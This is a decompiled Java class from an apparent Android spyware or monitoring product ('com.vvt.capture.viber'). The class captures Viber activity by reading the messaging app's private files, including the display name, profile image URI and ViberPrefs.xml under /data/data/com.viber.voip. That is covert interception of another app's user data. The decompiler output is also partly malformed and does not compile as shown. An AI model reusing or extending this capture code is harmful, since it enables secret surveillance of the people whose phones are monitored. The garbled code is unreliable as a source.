package com.vvt.capture.viber.mode.full;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.h.d;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class i
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private String e;
  private boolean f;
  private com.vvt.base.b g;
  private d h;
  
  public i(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    boolean bool = c.d();
    this.f = bool;
    this.g = paramb;
  }
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = c.a();
    int i = arrayOfString.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        String str = arrayOfString[j];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l2 = c.c();
        bool1 = false;
        Object localObject = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 5;
          if (j >= k) {
            break;
          }
          l3 = 2000L;
          SystemClock.sleep(l3);
          long l4 = c.c();
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label161;
      }
    }
    if (bool2) {}
    long l3 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label161:
      this.d = l3;
    }
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        bool = b();
        if (bool)
        {
          l1 = c.c();
          long l2 = c.a(paramInt);
          long l3 = 1L;
          long l4 = l2 - l3;
          localObject1 = "%s/%s";
          int i = 2;
          localObject2 = new Object[i];
          int j = 0;
          localObject3 = null;
          localObject4 = "/data/data/com.viber.voip/files/preferences/";
          localObject2[0] = localObject4;
          j = 1;
          localObject4 = "display_name";
          localObject2[j] = localObject4;
          localObject2 = String.format((String)localObject1, (Object[])localObject2);
          localObject1 = "%s/%s";
          j = 2;
          localObject3 = new Object[j];
          int k = 0;
          localObject4 = null;
          Object localObject5 = "/data/data/com.viber.voip/files/preferences/";
          localObject3[0] = localObject5;
          k = 1;
          localObject5 = "image_uri";
          localObject3[k] = localObject5;
          localObject3 = String.format((String)localObject1, (Object[])localObject3);
          localObject1 = "%s/%s";
          k = 2;
          localObject4 = new Object[k];
          int m = 0;
          localObject5 = null;
          String str1 = "/data/data/com.viber.voip/shared_prefs";
          localObject4[0] = str1;
          m = 1;
          str1 = "com.viber.voip.ViberPrefs.xml";
          localObject4[m] = str1;
          str2 = String.format((String)localObject1, (Object[])localObject4);
          bool = a;
          if (bool) {}
          localObject6 = this;
          bool = this.f;
          if (!bool) {
            continue;
          }
          localObject1 = this.e;
          localObject4 = this.h;
          localObject5 = this.g;
          localObject1 = j.a((String)localObject1, l4, l1, (String)localObject2, (String)localObject3, (d)localObject4, (com.vvt.base.b)localObject5);
          localObject6 = localArrayList;
          localArrayList.addAll((Collection)localObject1);
        }
      }
      catch (Exception localException)
      {
        long l1;
        Object localObject1;
        Object localObject2;
        Object localObject3;
        Object localObject4;
        String str2;
        Object localObject6;
        long l5;
        long l6;
        d locald;
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = a;
      if (bool) {}
      return localArrayList;
      localObject4 = this.e;
      l5 = 0L;
      l6 = paramInt;
      locald = this.h;
      localObject6 = this;
      localObject6 = this.g;
      localObject1 = b.a((String)localObject4, l5, l1, l6, (String)localObject2, (String)localObject3, str2, locald, (com.vvt.base.b)localObject6);
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject1 = paramg1.getReference();
        localObject1 = (Long)localObject1;
        l1 = ((Long)localObject1).longValue();
        localObject1 = paramg2.getReference();
        localObject1 = (Long)localObject1;
        l2 = ((Long)localObject1).longValue();
        localObject1 = "%s/%s";
        int i = 2;
        localObject2 = new Object[i];
        int j = 0;
        localObject3 = null;
        localObject4 = "/data/data/com.viber.voip/files/preferences/";
        localObject2[0] = localObject4;
        j = 1;
        localObject4 = "display_name";
        localObject2[j] = localObject4;
        localObject2 = String.format((String)localObject1, (Object[])localObject2);
        localObject1 = "%s/%s";
        j = 2;
        localObject3 = new Object[j];
        int k = 0;
        localObject4 = null;
        Object localObject5 = "/data/data/com.viber.voip/files/preferences/";
        localObject3[0] = localObject5;
        k = 1;
        localObject5 = "image_uri";
        localObject3[k] = localObject5;
        localObject3 = String.format((String)localObject1, (Object[])localObject3);
        localObject1 = "%s/%s";
        k = 2;
        localObject4 = new Object[k];
        int m = 0;
        localObject5 = null;
        String str1 = "/data/data/com.viber.voip/shared_prefs";
        localObject4[0] = str1;
        m = 1;
        str1 = "com.viber.voip.ViberPrefs.xml";
        localObject4[m] = str1;
        str2 = String.format((String)localObject1, (Object[])localObject4);
        bool = a;
        if (bool) {}
        localObject6 = this;
        bool = this.f;
        if (!bool) {
          continue;
        }
        localObject1 = this.e;
        localObject4 = this.h;
        localObject5 = this.g;
        localObject1 = j.a((String)localObject1, l1, l2, (String)localObject2, (String)localObject3, (d)localObject4, (com.vvt.base.b)localObject5);
        localObject6 = localArrayList;
        localArrayList.addAll((Collection)localObject1);
      }
      catch (Exception localException)
      {
        Object localObject1;
        long l1;
        long l2;
        Object localObject2;
        Object localObject3;
        Object localObject4;
        String str2;
        Object localObject6;
        long l3;
        d locald;
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = a;
      if (bool) {}
      return localArrayList;
      localObject4 = this.e;
      l3 = 2147483647L;
      locald = this.h;
      localObject6 = this;
      localObject6 = this.g;
      localObject1 = b.a((String)localObject4, l1, l2, l3, (String)localObject2, (String)localObject3, str2, locald, (com.vvt.base.b)localObject6);
    }
  }
  
  public void a(d paramd)
  {
    this.h = paramd;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/full/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */